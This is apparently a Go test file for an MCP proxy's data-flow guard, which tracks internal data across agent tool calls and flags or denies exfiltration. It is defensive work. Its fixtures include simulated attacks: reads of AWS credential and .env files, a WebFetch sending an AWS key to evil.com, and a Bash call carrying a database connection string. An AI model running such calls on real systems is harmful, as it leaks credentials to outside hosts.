package flow

import (
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// mockDetector implements a minimal sensitive data detector interface for testing.
type mockDetector struct {
	scanResult *DetectionResult
}

func (m *mockDetector) Scan(arguments, response string) *DetectionResult {
	if m.scanResult != nil {
		return m.scanResult
	}
	return &DetectionResult{Detected: false}
}

func newTestFlowService() *FlowService {
	classifier := NewClassifier(nil)
	trackerCfg := &TrackerConfig{
		SessionTimeoutMin:    30,
		MaxOriginsPerSession: 10000,
		HashMinLength:        20,
		MaxResponseHashBytes: 65536,
	}
	tracker := NewFlowTracker(trackerCfg)
	policyCfg := &PolicyConfig{
		InternalToExternal:    PolicyAsk,
		SensitiveDataExternal: PolicyDeny,
		SuspiciousEndpoints:   []string{"webhook.site"},
		ToolOverrides:         map[string]PolicyAction{"WebSearch": PolicyAllow},
	}
	policy := NewPolicyEvaluator(policyCfg)
	detector := &mockDetector{}

	return NewFlowService(classifier, tracker, policy, detector, nil)
}

func newTestFlowServiceWithDetector(det *mockDetector) *FlowService {
	classifier := NewClassifier(nil)
	trackerCfg := &TrackerConfig{
		SessionTimeoutMin:    30,
		MaxOriginsPerSession: 10000,
		HashMinLength:        20,
		MaxResponseHashBytes: 65536,
	}
	tracker := NewFlowTracker(trackerCfg)
	policyCfg := &PolicyConfig{
		InternalToExternal:    PolicyAsk,
		SensitiveDataExternal: PolicyDeny,
		SuspiciousEndpoints:   []string{"webhook.site"},
		ToolOverrides:         map[string]PolicyAction{"WebSearch": PolicyAllow},
	}
	policy := NewPolicyEvaluator(policyCfg)

	return NewFlowService(classifier, tracker, policy, det, nil)
}

func TestFlowService_FullPipeline_ProxyOnly(t *testing.T) {
	svc := newTestFlowService()
	defer svc.Stop()

	sessionID := "mcp-session-1"
	secretData := "This is a very secret database record that absolutely must not leak externally"

	// Step 1: Record origin from call_tool_read response (proxy-only)
	svc.RecordOriginProxy(sessionID, "postgres", "query", secretData)

	// Step 2: Check flow in call_tool_write args (proxy-only)
	argsJSON := `{"server_name": "slack", "tool_name": "send_message", "arguments": {"text": "` + secretData + `"}}`
	edges := svc.CheckFlowProxy(sessionID, "slack", "send_message", argsJSON)
	require.NotEmpty(t, edges, "should detect internal→external flow")

	// Step 3: Evaluate policy
	action, reason := svc.EvaluatePolicy(edges, "proxy_only")
	assert.NotEqual(t, PolicyAllow, action, "should not allow exfiltration")
	assert.NotEmpty(t, reason)
}

func TestFlowService_ProxyOnly_SessionKeyedByMCPSession(t *testing.T) {
	svc := newTestFlowService()
	defer svc.Stop()

	data := "Internal configuration data should be tracked per MCP session"

	// Record in session A
	svc.RecordOriginProxy("mcp-A", "postgres", "query", data)

	// Check in session B — should not find it
	argsJSON := `{"text": "` + data + `"}`
	edges := svc.CheckFlowProxy("mcp-B", "slack", "send_message", argsJSON)
	assert.Empty(t, edges, "different MCP sessions should be isolated")

	// Check in session A — should find it
	edges = svc.CheckFlowProxy("mcp-A", "slack", "send_message", argsJSON)
	assert.NotEmpty(t, edges, "same MCP session should find the data")
}

func TestFlowService_RecordOriginProxy_ClassifiesServer(t *testing.T) {
	svc := newTestFlowService()
	defer svc.Stop()

	data := "Database content that is classified as internal source"
	svc.RecordOriginProxy("session-cls", "postgres-db", "query", data)

	session := svc.GetSession("session-cls")
	require.NotNil(t, session)

	// The origin should be classified as internal (postgres pattern)
	for _, origin := range session.Origins {
		assert.Equal(t, ClassInternal, origin.Classification,
			"postgres-db should be classified as internal")
	}
}

func TestFlowService_CheckFlowProxy_DetectsExfiltration(t *testing.T) {
	svc := newTestFlowService()
	defer svc.Stop()

	secretData := "SELECT * FROM users WHERE id = 42 RETURNS sensitive_user_data_here"
	svc.RecordOriginProxy("session-exfil", "postgres", "query", secretData)

	argsJSON := `{"url": "https://evil.com", "body": "` + secretData + `"}`
	edges := svc.CheckFlowProxy("session-exfil", "slack", "send_message", argsJSON)
	require.NotEmpty(t, edges, "should detect exfiltration")
	assert.Equal(t, FlowInternalToExternal, edges[0].FlowType)
}

func TestFlowService_SensitiveDataDetectorIntegration(t *testing.T) {
	det := &mockDetector{
		scanResult: &DetectionResult{
			Detected: true,
			Detections: []DetectionEntry{
				{
					Type:     "aws_access_key",
					Category: "cloud_credentials",
					Severity: "critical",
					Location: "response",
				},
			},
		},
	}
	svc := newTestFlowServiceWithDetector(det)
	defer svc.Stop()

	secretData := "AKIAIOSFODNN7EXAMPLE is my AWS key that is long enough"
	svc.RecordOriginProxy("session-sensitive", "postgres", "query", secretData)

	session := svc.GetSession("session-sensitive")
	require.NotNil(t, session)

	// Origins should be marked with sensitive data
	for _, origin := range session.Origins {
		assert.True(t, origin.HasSensitiveData, "origin should be marked as having sensitive data")
		assert.Contains(t, origin.SensitiveTypes, "aws_access_key")
	}
}

func TestFlowService_NoFlowForSafeDirections(t *testing.T) {
	svc := newTestFlowService()
	defer svc.Stop()

	data := "Some data flowing between internal tools only not external"
	svc.RecordOriginProxy("session-safe", "postgres", "query", data)

	// Internal→internal (Write is internal)
	argsJSON := `{"content": "` + data + `"}`
	edges := svc.CheckFlowProxy("session-safe", "postgres", "insert", argsJSON)

	// Even if edges are detected, they should be safe
	for _, edge := range edges {
		assert.NotEqual(t, FlowInternalToExternal, edge.FlowType,
			"internal→internal should not be flagged as exfiltration")
	}
}

func TestFlowService_EvaluatePolicy_DelegatesCorrectly(t *testing.T) {
	svc := newTestFlowService()
	defer svc.Stop()

	// Empty edges
	action, _ := svc.EvaluatePolicy(nil, "proxy_only")
	assert.Equal(t, PolicyAllow, action, "nil edges should be allowed")

	// Safe edges
	safeEdges := []*FlowEdge{{
		FlowType:  FlowInternalToInternal,
		RiskLevel: RiskNone,
		FromOrigin: &DataOrigin{Classification: ClassInternal},
		ToToolName: "Write",
		Timestamp:  time.Now(),
	}}
	action, _ = svc.EvaluatePolicy(safeEdges, "proxy_only")
	assert.Equal(t, PolicyAllow, action)
}

func TestFlowService_GetSession_ReturnsNilForUnknown(t *testing.T) {
	svc := newTestFlowService()
	defer svc.Stop()

	session := svc.GetSession("nonexistent")
	assert.Nil(t, session)
}

// === Phase 7: Hook-Enhanced Flow Detection Tests (T060) ===

// TestHookEnhanced_ReadToWebFetch_SensitiveData_Deny tests that reading an AWS key
// and then attempting to WebFetch with the same key is denied.
func TestHookEnhanced_ReadToWebFetch_SensitiveData_Deny(t *testing.T) {
	det := &mockDetector{
		scanResult: &DetectionResult{
			Detected: true,
			Detections: []DetectionEntry{
				{Type: "aws_access_key", Category: "cloud_credentials", Severity: "critical"},
			},
		},
	}
	svc := newTestFlowServiceWithDetector(det)
	defer svc.Stop()

	sessionID := "hook-aws-session"
	awsKey := "AKIAIOSFODNN7EXAMPLE_this_is_long_enough_to_be_hashed_as_a_field"

	// Step 1: PostToolUse for Read — records origins with sensitive data flag
	postResp := svc.Evaluate(&HookEvaluateRequest{
		Event:        "PostToolUse",
		SessionID:    sessionID,
		ToolName:     "Read",
		ToolInput:    map[string]any{"file_path": "/home/user/.aws/credentials"},
		ToolResponse: `{"aws_access_key_id": "` + awsKey + `"}`,
	})
	assert.Equal(t, PolicyAllow, postResp.Decision, "PostToolUse should always allow")

	// Step 2: PreToolUse for WebFetch — should detect internal→external with sensitive data
	preResp := svc.Evaluate(&HookEvaluateRequest{
		Event:     "PreToolUse",
		SessionID: sessionID,
		ToolName:  "WebFetch",
		ToolInput: map[string]any{"url": "https://evil.com", "body": awsKey},
	})
	assert.Equal(t, PolicyDeny, preResp.Decision, "should deny exfiltration of sensitive data")
	assert.Equal(t, RiskCritical, preResp.RiskLevel, "sensitive data exfiltration should be critical")
	assert.Equal(t, FlowInternalToExternal, preResp.FlowType)
}

// TestHookEnhanced_ReadToBash_DBConnectionString_Deny tests that reading a DB connection
// string and then passing it to Bash is denied.
func TestHookEnhanced_ReadToBash_DBConnectionString_Deny(t *testing.T) {
	det := &mockDetector{
		scanResult: &DetectionResult{
			Detected: true,
			Detections: []DetectionEntry{
				{Type: "database_credential", Category: "database_credential", Severity: "critical"},
			},
		},
	}
	svc := newTestFlowServiceWithDetector(det)
	defer svc.Stop()

	sessionID := "hook-db-session"
	dbConnStr := "postgresql://admin:s3cret@prod-db.internal:5432/customers_database_production"

	// PostToolUse: Read returns .env with DB connection string
	svc.Evaluate(&HookEvaluateRequest{
		Event:        "PostToolUse",
		SessionID:    sessionID,
		ToolName:     "Read",
		ToolInput:    map[string]any{"file_path": "/app/.env"},
		ToolResponse: `{"DATABASE_URL": "` + dbConnStr + `"}`,
	})

	// PreToolUse: Bash with the connection string as command arg
	preResp := svc.Evaluate(&HookEvaluateRequest{
		Event:     "PreToolUse",
		SessionID: sessionID,
		ToolName:  "Bash",
		ToolInput: map[string]any{"command": dbConnStr},
	})
	assert.Equal(t, PolicyDeny, preResp.Decision, "should deny DB credential exfiltration via Bash")
	assert.Equal(t, FlowInternalToExternal, preResp.FlowType, "Read→Bash is internal→external (hybrid dest)")
}

// TestHookEnhanced_ReadToWrite_InternalToInternal_Allow tests that Read→Write
// (internal→internal) is allowed with risk none.
func TestHookEnhanced_ReadToWrite_InternalToInternal_Allow(t *testing.T) {
	svc := newTestFlowService()
	defer svc.Stop()

	sessionID := "hook-safe-session"
	content := "Internal configuration data that stays within internal tools safely"

	// PostToolUse: Read returns internal data
	svc.Evaluate(&HookEvaluateRequest{
		Event:        "PostToolUse",
		SessionID:    sessionID,
		ToolName:     "Read",
		ToolInput:    map[string]any{"file_path": "/app/config.yaml"},
		ToolResponse: content,
	})

	// PreToolUse: Write with the same content (internal→internal)
	preResp := svc.Evaluate(&HookEvaluateRequest{
		Event:     "PreToolUse",
		SessionID: sessionID,
		ToolName:  "Write",
		ToolInput: map[string]any{"content": content},
	})
	assert.Equal(t, PolicyAllow, preResp.Decision, "internal→internal should be allowed")
	assert.Equal(t, RiskNone, preResp.RiskLevel)
}

// TestHookEnhanced_SessionIsolation tests that two hook sessions don't cross-contaminate.
func TestHookEnhanced_SessionIsolation(t *testing.T) {
	svc := newTestFlowService()
	defer svc.Stop()

	secret := "Super secret data only available in session Alpha not Beta"

	// Record origin in session Alpha
	svc.Evaluate(&HookEvaluateRequest{
		Event:        "PostToolUse",
		SessionID:    "alpha",
		ToolName:     "Read",
		ToolInput:    map[string]any{},
		ToolResponse: secret,
	})

	// Check in session Beta — should NOT match
	betaResp := svc.Evaluate(&HookEvaluateRequest{
		Event:     "PreToolUse",
		SessionID: "beta",
		ToolName:  "WebFetch",
		ToolInput: map[string]any{"data": secret},
	})
	assert.Equal(t, PolicyAllow, betaResp.Decision, "different sessions should not cross-contaminate")
	assert.Equal(t, RiskNone, betaResp.RiskLevel)

	// Check in session Alpha — should match
	alphaResp := svc.Evaluate(&HookEvaluateRequest{
		Event:     "PreToolUse",
		SessionID: "alpha",
		ToolName:  "WebFetch",
		ToolInput: map[string]any{"data": secret},
	})
	assert.NotEqual(t, PolicyAllow, alphaResp.Decision, "same session should detect flow")
}

// TestHookEnhanced_PostToolUse_NeverDenies tests that PostToolUse always returns allow,
// even when critical sensitive data is detected.
func TestHookEnhanced_PostToolUse_NeverDenies(t *testing.T) {
	det := &mockDetector{
		scanResult: &DetectionResult{
			Detected: true,
			Detections: []DetectionEntry{
				{Type: "private_key", Category: "private_key", Severity: "critical"},
			},
		},
	}
	svc := newTestFlowServiceWithDetector(det)
	defer svc.Stop()

	resp := svc.Evaluate(&HookEvaluateRequest{
		Event:        "PostToolUse",
		SessionID:    "session-post-only",
		ToolName:     "Read",
		ToolInput:    map[string]any{},
		ToolResponse: "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA long enough key data here for hashing\n-----END RSA PRIVATE KEY-----",
	})
	assert.Equal(t, PolicyAllow, resp.Decision, "PostToolUse should never deny")
}

// TestHookEnhanced_PerFieldMatching tests that per-field hash extraction detects
// when a specific field value from a JSON response appears in subsequent tool args.
func TestHookEnhanced_PerFieldMatching(t *testing.T) {
	svc := newTestFlowService()
	defer svc.Stop()

	sessionID := "hook-field-match"
	secretField := "this_is_a_secret_api_token_that_must_not_leak_externally"

	// PostToolUse: Read returns nested JSON with a specific field
	svc.Evaluate(&HookEvaluateRequest{
		Event:        "PostToolUse",
		SessionID:    sessionID,
		ToolName:     "Read",
		ToolInput:    map[string]any{},
		ToolResponse: `{"config": {"api_key": "` + secretField + `", "debug": "on"}}`,
	})

	// PreToolUse: WebFetch with the secret field value in args
	preResp := svc.Evaluate(&HookEvaluateRequest{
		Event:     "PreToolUse",
		SessionID: sessionID,
		ToolName:  "WebFetch",
		ToolInput: map[string]any{"url": "https://example.com", "data": secretField},
	})
	assert.NotEqual(t, PolicyAllow, preResp.Decision, "should detect per-field exfiltration")
	assert.Equal(t, FlowInternalToExternal, preResp.FlowType)
}

// === Phase 9: Session Correlation Integration Tests (T081) ===

func newTestFlowServiceWithCorrelator() *FlowService {
	classifier := NewClassifier(nil)
	trackerCfg := &TrackerConfig{
		SessionTimeoutMin:    30,
		MaxOriginsPerSession: 10000,
		HashMinLength:        20,
		MaxResponseHashBytes: 65536,
	}
	tracker := NewFlowTracker(trackerCfg)
	policyCfg := &PolicyConfig{
		InternalToExternal:    PolicyAsk,
		SensitiveDataExternal: PolicyDeny,
		SuspiciousEndpoints:   []string{"webhook.site"},
		ToolOverrides:         map[string]PolicyAction{"WebSearch": PolicyAllow},
	}
	policy := NewPolicyEvaluator(policyCfg)
	detector := &mockDetector{}
	correlator := NewCorrelator(5 * time.Second)

	return NewFlowService(classifier, tracker, policy, detector, correlator)
}

// TestCorrelation_PreToolUse_McpProxy_RegistersPending tests that PreToolUse for
// mcp__mcpproxy__call_tool_read registers a pending correlation.
func TestCorrelation_PreToolUse_McpProxy_RegistersPending(t *testing.T) {
	svc := newTestFlowServiceWithCorrelator()
	defer svc.Stop()

	hookSessionID := "hook-session-corr1"

	// Agent calls mcp__mcpproxy__call_tool_read — this is the hook PreToolUse event
	resp := svc.Evaluate(&HookEvaluateRequest{
		Event:     "PreToolUse",
		SessionID: hookSessionID,
		ToolName:  "mcp__mcpproxy__call_tool_read",
		ToolInput: map[string]any{
			"name":      "postgres:query",
			"args_json": `{"sql":"SELECT * FROM users"}`,
		},
	})
	assert.Equal(t, PolicyAllow, resp.Decision, "mcp__mcpproxy__* PreToolUse should allow")

	// Verify pending correlation was registered by attempting a match
	argsHash := CorrelationArgsHash("postgres:query", `{"sql":"SELECT * FROM users"}`)
	matched := svc.correlator.MatchAndConsume(argsHash)
	assert.Equal(t, hookSessionID, matched, "pending correlation should be registered")
}

// TestCorrelation_LinkSessions tests that matching MCP call links hook and MCP sessions.
func TestCorrelation_LinkSessions(t *testing.T) {
	svc := newTestFlowServiceWithCorrelator()
	defer svc.Stop()

	hookSessionID := "hook-session-link"
	mcpSessionID := "mcp-session-link"

	// Step 1: Hook PostToolUse records origin in hook session
	svc.Evaluate(&HookEvaluateRequest{
		Event:        "PostToolUse",
		SessionID:    hookSessionID,
		ToolName:     "Read",
		ToolInput:    map[string]any{"file_path": "/app/secrets.env"},
		ToolResponse: `{"API_KEY": "sk-very-secret-api-key-that-is-long-enough-to-hash"}`,
	})

	// Step 2: Hook PreToolUse for mcp__mcpproxy__call_tool_read registers pending
	svc.Evaluate(&HookEvaluateRequest{
		Event:     "PreToolUse",
		SessionID: hookSessionID,
		ToolName:  "mcp__mcpproxy__call_tool_read",
		ToolInput: map[string]any{
			"name":      "postgres:query",
			"args_json": `{"sql":"SELECT * FROM users"}`,
		},
	})

	// Step 3: MCP proxy receives matching call — link sessions
	argsHash := CorrelationArgsHash("postgres:query", `{"sql":"SELECT * FROM users"}`)
	svc.LinkSessions(argsHash, mcpSessionID)

	// Step 4: Verify sessions are linked — MCP session should see hook origins
	mcpSession := svc.GetSession(mcpSessionID)
	require.NotNil(t, mcpSession, "MCP session should exist after linking")
	assert.Contains(t, mcpSession.LinkedMCPSessions, hookSessionID,
		"MCP session should reference the linked hook session")
}

// TestCorrelation_LinkedSessions_ShareFlowState tests that origins from hook session
// are visible when checking flows in MCP context.
func TestCorrelation_LinkedSessions_ShareFlowState(t *testing.T) {
	svc := newTestFlowServiceWithCorrelator()
	defer svc.Stop()

	hookSessionID := "hook-shared-flow"
	mcpSessionID := "mcp-shared-flow"

	secretData := "super-secret-internal-data-that-must-not-leak-to-external-services"

	// Step 1: Record origin via hook (PostToolUse for Read)
	svc.Evaluate(&HookEvaluateRequest{
		Event:        "PostToolUse",
		SessionID:    hookSessionID,
		ToolName:     "Read",
		ToolInput:    map[string]any{},
		ToolResponse: `{"content": "` + secretData + `"}`,
	})

	// Step 2: Register pending correlation via hook PreToolUse
	svc.Evaluate(&HookEvaluateRequest{
		Event:     "PreToolUse",
		SessionID: hookSessionID,
		ToolName:  "mcp__mcpproxy__call_tool_write",
		ToolInput: map[string]any{
			"name":      "slack:send_message",
			"args_json": `{"text":"` + secretData + `"}`,
		},
	})

	// Step 3: Link via MCP proxy
	argsHash := CorrelationArgsHash("slack:send_message", `{"text":"`+secretData+`"}`)
	svc.LinkSessions(argsHash, mcpSessionID)

	// Step 4: MCP proxy checks flow — should detect exfiltration because
	// the origin from the hook session is visible in the linked MCP session
	edges := svc.CheckFlowProxy(mcpSessionID, "slack", "send_message",
		`{"text":"`+secretData+`"}`)
	assert.NotEmpty(t, edges, "linked sessions should share origins for flow detection")
}

// TestCorrelation_StaleCorrelation_Ignored tests that expired correlations are not matched.
func TestCorrelation_StaleCorrelation_Ignored(t *testing.T) {
	// Create service with a very short correlator TTL
	classifier := NewClassifier(nil)
	trackerCfg := &TrackerConfig{
		SessionTimeoutMin:    30,
		MaxOriginsPerSession: 10000,
		HashMinLength:        20,
		MaxResponseHashBytes: 65536,
	}
	tracker := NewFlowTracker(trackerCfg)
	policyCfg := &PolicyConfig{
		InternalToExternal:    PolicyAsk,
		SensitiveDataExternal: PolicyDeny,
	}
	policy := NewPolicyEvaluator(policyCfg)
	correlator := NewCorrelator(50 * time.Millisecond) // Very short TTL

	svc := NewFlowService(classifier, tracker, policy, &mockDetector{}, correlator)
	defer svc.Stop()

	// Register pending via hook PreToolUse
	svc.Evaluate(&HookEvaluateRequest{
		Event:     "PreToolUse",
		SessionID: "hook-stale",
		ToolName:  "mcp__mcpproxy__call_tool_read",
		ToolInput: map[string]any{
			"name":      "postgres:query",
			"args_json": `{"sql":"SELECT 1"}`,
		},
	})

	// Wait for TTL to expire
	time.Sleep(100 * time.Millisecond)

	// Attempt to link — should fail because correlation expired
	argsHash := CorrelationArgsHash("postgres:query", `{"sql":"SELECT 1"}`)
	hookID := svc.correlator.MatchAndConsume(argsHash)
	assert.Empty(t, hookID, "stale correlation should not match")
}
